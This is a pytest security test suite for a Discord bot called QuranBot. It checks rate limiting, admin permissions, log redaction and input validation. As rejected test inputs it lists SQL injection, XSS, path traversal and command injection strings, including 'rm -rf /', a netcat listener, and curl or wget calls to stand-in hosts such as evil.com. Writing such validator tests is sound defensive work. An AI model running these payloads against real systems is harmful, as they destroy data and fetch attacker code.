# =============================================================================
# QuranBot - Comprehensive Security Tests
# =============================================================================
# Test suite covering all security features including rate limiting, input
# validation, permission checking, data sanitization, and configuration security.
# =============================================================================

import asyncio
import os
import tempfile
import time
from unittest.mock import AsyncMock, Mock, patch

import pytest

from src.config.bot_config import BotConfig
from src.core.exceptions import ConfigurationError, SecurityError, ValidationError
from src.core.security import (
    InputValidator,
    RateLimiter,
    SecurityService,
    rate_limit,
    require_admin,
    validate_input,
)
from src.core.structured_logger import StructuredLogger

# =============================================================================
# Test Fixtures
# =============================================================================


@pytest.fixture
async def mock_logger():
    """Create a mock structured logger"""
    logger = Mock(spec=StructuredLogger)
    logger.info = AsyncMock()
    logger.warning = AsyncMock()
    logger.error = AsyncMock()
    logger.debug = AsyncMock()
    return logger


@pytest.fixture
def mock_bot():
    """Create a mock Discord bot"""
    bot = Mock()
    bot.user = Mock()
    bot.user.id = 987654321
    return bot


@pytest.fixture
def mock_ctx():
    """Create a mock Discord context"""
    ctx = Mock()
    ctx.author = Mock()
    ctx.author.id = 123456789
    ctx.guild = Mock()
    ctx.guild.id = 111222333
    ctx.command = Mock()
    ctx.command.name = "test_command"
    return ctx


@pytest.fixture
async def rate_limiter(mock_logger):
    """Create RateLimiter instance for testing"""
    return RateLimiter(logger=mock_logger)


@pytest.fixture
async def input_validator(mock_logger):
    """Create InputValidator instance for testing"""
    return InputValidator(logger=mock_logger)


@pytest.fixture
async def security_service(mock_logger, mock_bot):
    """Create SecurityService instance for testing"""
    config = Mock()
    config.admin_user_ids = [123456789, 987654321]
    config.RATE_LIMIT_PER_MINUTE = 10

    service = SecurityService(logger=mock_logger)
    service._bot = mock_bot
    service._config = config
    return service


@pytest.fixture
def temp_env_file():
    """Create temporary environment file for testing"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".env", delete=False) as f:
        f.write(
            """
# Test configuration
DISCORD_TOKEN=test_token_here
GUILD_ID=123456789
TARGET_CHANNEL_ID=987654321
"""
        )
        temp_path = f.name

    yield temp_path
    os.unlink(temp_path)


# =============================================================================
# Rate Limiter Security Tests
# =============================================================================


class TestRateLimiterSecurity:
    """Test rate limiting security features"""

    @pytest.mark.asyncio
    async def test_sliding_window_rate_limit_enforcement(self, rate_limiter):
        """Test sliding window rate limiting prevents abuse"""
        user_id = 123456789
        command = "verse"
        limit = 5
        window_seconds = 60

        # Should allow initial requests
        for i in range(limit):
            result = await rate_limiter.check_sliding_window(
                user_id, command, limit, window_seconds
            )
            assert result is True

        # Should block after limit exceeded
        result = await rate_limiter.check_sliding_window(
            user_id, command, limit, window_seconds
        )
        assert result is False

    @pytest.mark.asyncio
    async def test_token_bucket_prevents_burst_attacks(self, rate_limiter):
        """Test token bucket prevents burst attack patterns"""
        user_id = 123456789
        command = "quiz"
        bucket_size = 3
        refill_rate = 0.5  # 0.5 tokens per second

        # Consume all tokens rapidly
        for i in range(bucket_size):
            result = await rate_limiter.check_token_bucket(
                user_id, command, bucket_size, refill_rate
            )
            assert result is True

        # Should be blocked after consuming all tokens
        result = await rate_limiter.check_token_bucket(
            user_id, command, bucket_size, refill_rate
        )
        assert result is False

        # Wait for token refill
        await asyncio.sleep(2.1)  # Wait for one token to refill

        # Should allow one more request
        result = await rate_limiter.check_token_bucket(
            user_id, command, bucket_size, refill_rate
        )
        assert result is True

    @pytest.mark.asyncio
    async def test_rate_limit_isolation_between_users(self, rate_limiter):
        """Test rate limits are isolated between different users"""
        user1 = 111111111
        user2 = 222222222
        command = "test"
        limit = 2
        window_seconds = 60

        # User 1 exhausts their limit
        for i in range(limit):
            await rate_limiter.check_sliding_window(
                user1, command, limit, window_seconds
            )

        # User 1 should be blocked
        result = await rate_limiter.check_sliding_window(
            user1, command, limit, window_seconds
        )
        assert result is False

        # User 2 should still be allowed
        result = await rate_limiter.check_sliding_window(
            user2, command, limit, window_seconds
        )
        assert result is True

    @pytest.mark.asyncio
    async def test_rate_limit_cleanup_prevents_memory_leaks(self, rate_limiter):
        """Test rate limit cleanup prevents memory accumulation"""
        # Create many expired entries
        current_time = time.time()
        for i in range(100):
            user_id = 1000000 + i
            command = f"test_command_{i}"
            # Add old entries that should be cleaned up
            rate_limiter._request_history[f"{command}:{user_id}"] = [
                current_time - 3600  # 1 hour ago
            ]

        # Trigger cleanup
        await rate_limiter._cleanup_expired_entries()

        # Old entries should be removed
        assert len(rate_limiter._request_history) == 0

    @pytest.mark.asyncio
    async def test_global_rate_limit_prevents_system_abuse(self, rate_limiter):
        """Test global rate limiting prevents system-wide abuse"""
        limit = 5
        window_seconds = 60

        # Create requests from different users
        for i in range(limit):
            user_id = 1000000 + i
            result = await rate_limiter.check_global_rate_limit(limit, window_seconds)
            assert result is True

        # Should block additional requests regardless of user
        result = await rate_limiter.check_global_rate_limit(limit, window_seconds)
        assert result is False


# =============================================================================
# Input Validation Security Tests
# =============================================================================


class TestInputValidationSecurity:
    """Test input validation security features"""

    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self, input_validator):
        """Test SQL injection attempt detection and blocking"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM sensitive_data",
            "1; DELETE FROM users WHERE 1=1; --",
            "'; UPDATE users SET password='hacked'; --",
        ]

        for malicious_input in malicious_inputs:
            result = await input_validator.validate_text_input(malicious_input)
            assert result is False, f"Should reject SQL injection: {malicious_input}"

    @pytest.mark.asyncio
    async def test_xss_prevention(self, input_validator):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
        ]

        for payload in xss_payloads:
            result = await input_validator.validate_text_input(payload)
            assert result is False, f"Should reject XSS payload: {payload}"

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self, input_validator):
        """Test command injection prevention"""
        command_injections = [
            "; rm -rf /",
            "| nc -l -p 1234",
            "& wget malicious.com/script.sh",
            "`curl evil.com`",
            "$(curl attacker.com)",
        ]

        for injection in command_injections:
            result = await input_validator.validate_text_input(injection)
            assert result is False, f"Should reject command injection: {injection}"

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, input_validator):
        """Test path traversal attack prevention"""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/var/log/auth.log",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for path in path_traversals:
            result = await input_validator.validate_file_path(path)
            assert result is False, f"Should reject path traversal: {path}"

    @pytest.mark.asyncio
    async def test_legitimate_input_acceptance(self, input_validator):
        """Test legitimate inputs are accepted"""
        valid_inputs = [
            "verse 1",
            "Surah Al-Fatiha",
            "play audio",
            "quiz question about Islam",
            "Saad Al Ghamdi reciter",
        ]

        for valid_input in valid_inputs:
            result = await input_validator.validate_text_input(valid_input)
            assert result is True, f"Should accept valid input: {valid_input}"

    @pytest.mark.asyncio
    async def test_input_length_limits(self, input_validator):
        """Test input length validation prevents buffer overflow attempts"""
        # Very long input should be rejected
        long_input = "A" * 10000
        result = await input_validator.validate_text_input(long_input, max_length=100)
        assert result is False

        # Normal length should be accepted
        normal_input = "Normal verse request"
        result = await input_validator.validate_text_input(normal_input, max_length=100)
        assert result is True

    @pytest.mark.asyncio
    async def test_unicode_normalization_security(self, input_validator):
        """Test Unicode normalization prevents bypass attempts"""
        # Unicode variations that could bypass filters
        unicode_attempts = [
            "scr\u0131pt",  # Dotless i
            "java\u202escript:",  # Right-to-left override
            "＜script＞",  # Full-width characters
            "s\u0063ript",  # Mixed encodings
        ]

        for attempt in unicode_attempts:
            result = await input_validator.validate_text_input(attempt)
            assert result is False, f"Should reject Unicode bypass: {attempt}"


# =============================================================================
# Permission and Access Control Tests
# =============================================================================


class TestPermissionSecurity:
    """Test permission and access control security"""

    @pytest.mark.asyncio
    async def test_admin_permission_enforcement(self, security_service):
        """Test admin permission checking"""
        # Admin user should have access
        is_admin = await security_service.check_admin_permission(123456789)
        assert is_admin is True

        # Non-admin user should not have access
        is_admin = await security_service.check_admin_permission(999999999)
        assert is_admin is False

    @pytest.mark.asyncio
    async def test_require_admin_decorator(self, security_service, mock_ctx):
        """Test require_admin decorator functionality"""

        @require_admin
        async def admin_only_function(ctx):
            return "success"

        # Mock admin user
        mock_ctx.author.id = 123456789

        with patch(
            "src.core.security.get_security_service", return_value=security_service
        ):
            result = await admin_only_function(mock_ctx)
            assert result == "success"

        # Mock non-admin user
        mock_ctx.author.id = 999999999

        with patch(
            "src.core.security.get_security_service", return_value=security_service
        ):
            with pytest.raises(SecurityError):
                await admin_only_function(mock_ctx)

    @pytest.mark.asyncio
    async def test_guild_permission_isolation(self, security_service):
        """Test guild-based permission isolation"""
        # Different guilds should have isolated permissions
        guild1_user = 111111111
        guild2_user = 222222222

        # Mock guild-specific permissions
        security_service._guild_admins = {
            123456789: [guild1_user],  # Guild 1 admins
            987654321: [guild2_user],  # Guild 2 admins
        }

        # User should only be admin in their guild
        is_admin_g1 = await security_service.check_guild_admin_permission(
            guild1_user, 123456789
        )
        assert is_admin_g1 is True

        # Same user should not be admin in different guild
        is_admin_g2 = await security_service.check_guild_admin_permission(
            guild1_user, 987654321
        )
        assert is_admin_g2 is False

    @pytest.mark.asyncio
    async def test_permission_escalation_prevention(self, security_service):
        """Test prevention of permission escalation attempts"""
        # User should not be able to elevate their own permissions
        regular_user = 555555555

        # Attempt to add themselves to admin list should fail
        with pytest.raises(SecurityError):
            await security_service.add_admin_user(regular_user, regular_user)

        # Only existing admins should be able to add new admins
        admin_user = 123456789
        result = await security_service.add_admin_user(admin_user, regular_user)
        assert result is True


# =============================================================================
# Data Sanitization and Privacy Tests
# =============================================================================


class TestDataSanitizationSecurity:
    """Test data sanitization and privacy protection"""

    @pytest.mark.asyncio
    async def test_sensitive_data_sanitization(self, security_service):
        """Test sanitization of sensitive data for logging"""
        sensitive_data = {
            "discord_token": "FAKE_TOKEN_FOR_TESTING.12345.67890-abcdef",
            "password": "super_secret_password",
            "api_key": "sk-1234567890abcdef",
            "webhook_url": "https://discord.com/api/webhooks/123/abc",
            "user_message": "This is a normal message",
            "surah_number": 1,
        }

        sanitized = await security_service.sanitize_for_logging(sensitive_data)

        # Sensitive fields should be redacted
        assert sanitized["discord_token"] == "[REDACTED]"
        assert sanitized["password"] == "[REDACTED]"
        assert sanitized["api_key"] == "[REDACTED]"

        # Non-sensitive fields should remain
        assert sanitized["user_message"] == "This is a normal message"
        assert sanitized["surah_number"] == 1

    @pytest.mark.asyncio
    async def test_url_sanitization(self, security_service):
        """Test URL sanitization removes sensitive parameters"""
        urls_with_secrets = [
            "https://api.example.com/data?token=secret123&user=john",
            "https://discord.com/api/webhooks/123/secret_token_here",
            "https://service.com/callback?api_key=12345&data=info",
        ]

        for url in urls_with_secrets:
            sanitized = await security_service.sanitize_url(url)
            assert "secret" not in sanitized.lower()
            assert "token" not in sanitized.lower()
            assert "api_key" not in sanitized.lower()

    @pytest.mark.asyncio
    async def test_user_id_anonymization(self, security_service):
        """Test user ID anonymization for privacy"""
        user_data = {
            "user_id": 123456789012345678,
            "username": "testuser",
            "message": "Hello world",
            "timestamp": "2025-01-01T00:00:00Z",
        }

        anonymized = await security_service.anonymize_user_data(user_data)

        # User ID should be hashed/anonymized
        assert anonymized["user_id"] != user_data["user_id"]
        assert isinstance(anonymized["user_id"], str)
        assert len(anonymized["user_id"]) > 10  # Should be a hash

        # Other data should remain (unless specifically sensitive)
        assert anonymized["message"] == "Hello world"
        assert anonymized["timestamp"] == "2025-01-01T00:00:00Z"


# =============================================================================
# Configuration Security Tests
# =============================================================================


class TestConfigurationSecurity:
    """Test configuration security features"""

    def test_environment_variable_validation(self):
        """Test environment variable security validation"""
        # Test with insecure values
        insecure_env = {
            "DISCORD_TOKEN": "fake_token_123",  # Too short
            "ADMIN_USER_ID": "not_a_number",
            "GUILD_ID": "invalid_id",
        }

        with patch.dict(os.environ, insecure_env):
            with pytest.raises((ValidationError, ConfigurationError)):
                BotConfig()

    def test_configuration_file_permissions(self, temp_env_file):
        """Test configuration file has secure permissions"""
        # Configuration files should not be world-readable
        file_stat = os.stat(temp_env_file)
        permissions = oct(file_stat.st_mode)[-3:]

        # Should not be world-readable (last digit should be 0)
        assert permissions.endswith("0"), f"Config file too permissive: {permissions}"

    def test_sensitive_data_not_in_defaults(self):
        """Test no sensitive data in default configuration"""
        config_content = """
        DEFAULT_RECITER=Saad Al Ghamdi
        AUDIO_QUALITY=128k
        LOG_LEVEL=INFO
        """

        # Should not contain any tokens, keys, or sensitive data
        sensitive_patterns = ["token", "key", "password", "secret", "MTM4OTY2"]
        for pattern in sensitive_patterns:
            assert pattern.lower() not in config_content.lower()

    def test_configuration_validation_prevents_injection(self):
        """Test configuration validation prevents injection attacks"""
        malicious_values = {
            "AUDIO_FOLDER": "../../../etc/passwd",
            "FFMPEG_PATH": "/bin/sh; rm -rf /",
            "LOG_LEVEL": "INFO'; DROP TABLE logs; --",
        }

        with patch.dict(os.environ, malicious_values):
            with pytest.raises((ValidationError, ConfigurationError)):
                BotConfig()


# =============================================================================
# Integration Security Tests
# =============================================================================


class TestIntegrationSecurity:
    """Test security in integration scenarios"""

    @pytest.mark.asyncio
    async def test_decorator_stacking_security(self, mock_ctx, security_service):
        """Test multiple security decorators work together"""

        @rate_limit(limit=5, window=60)
        @validate_input
        @require_admin
        async def secure_function(ctx, text_input: str):
            return f"Processed: {text_input}"

        # Setup mocks
        mock_ctx.author.id = 123456789  # Admin user

        with patch(
            "src.core.security.get_security_service", return_value=security_service
        ):
            # Valid input should work
            result = await secure_function(mock_ctx, "valid input")
            assert "Processed: valid input" in result

            # Malicious input should be blocked by validation
            with pytest.raises(ValidationError):
                await secure_function(mock_ctx, "<script>alert('xss')</script>")

    @pytest.mark.asyncio
    async def test_concurrent_security_checks(self, security_service):
        """Test security checks under concurrent load"""

        async def make_request(user_id, command):
            return await security_service.check_rate_limit(user_id, command, 5, 60)

        # Create concurrent requests
        tasks = []
        for i in range(20):
            task = make_request(123456789, "test_command")
            tasks.append(task)

        # Execute concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Some should succeed, some should be rate limited
        successes = sum(1 for r in results if r is True)
        failures = sum(1 for r in results if r is False)

        assert successes > 0, "Some requests should succeed"
        assert failures > 0, "Some requests should be rate limited"

    @pytest.mark.asyncio
    async def test_security_logging_integration(self, mock_logger, security_service):
        """Test security events are properly logged"""
        # Trigger a security event
        with pytest.raises(SecurityError):
            await security_service.check_admin_permission(999999999, require=True)

        # Verify security event was logged
        mock_logger.warning.assert_called()

        # Check log message contains security context
        call_args = mock_logger.warning.call_args
        assert "security" in str(call_args).lower()


# =============================================================================
# Security Regression Tests
# =============================================================================


class TestSecurityRegression:
    """Test against known security vulnerabilities"""

    @pytest.mark.asyncio
    async def test_timing_attack_resistance(self, security_service):
        """Test resistance to timing attacks on authentication"""
        import time

        # Time admin check for valid user
        start_time = time.time()
        await security_service.check_admin_permission(123456789)
        valid_time = time.time() - start_time

        # Time admin check for invalid user
        start_time = time.time()
        await security_service.check_admin_permission(999999999)
        invalid_time = time.time() - start_time

        # Time difference should be minimal (within 10ms)
        time_diff = abs(valid_time - invalid_time)
        assert time_diff < 0.01, f"Timing attack possible: {time_diff}s difference"

    @pytest.mark.asyncio
    async def test_memory_disclosure_prevention(self, input_validator):
        """Test prevention of memory disclosure through input"""
        # Attempt to trigger memory disclosure
        memory_attack_inputs = [
            "\x00" * 1000,  # Null bytes
            "\xff" * 1000,  # High bytes
            "A" * 100000,  # Buffer overflow attempt
        ]

        for attack_input in memory_attack_inputs:
            result = await input_validator.validate_text_input(attack_input)
            assert result is False, f"Should block memory attack: {attack_input!r}"

    @pytest.mark.asyncio
    async def test_resource_exhaustion_prevention(self, rate_limiter):
        """Test prevention of resource exhaustion attacks"""
        # Rapid-fire requests should be blocked
        user_id = 123456789
        blocked_count = 0

        for i in range(100):  # Try many requests quickly
            result = await rate_limiter.check_sliding_window(
                user_id, "resource_test", 5, 60
            )
            if not result:
                blocked_count += 1

        # Most requests should be blocked
        assert blocked_count > 90, f"Only {blocked_count}/100 requests blocked"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
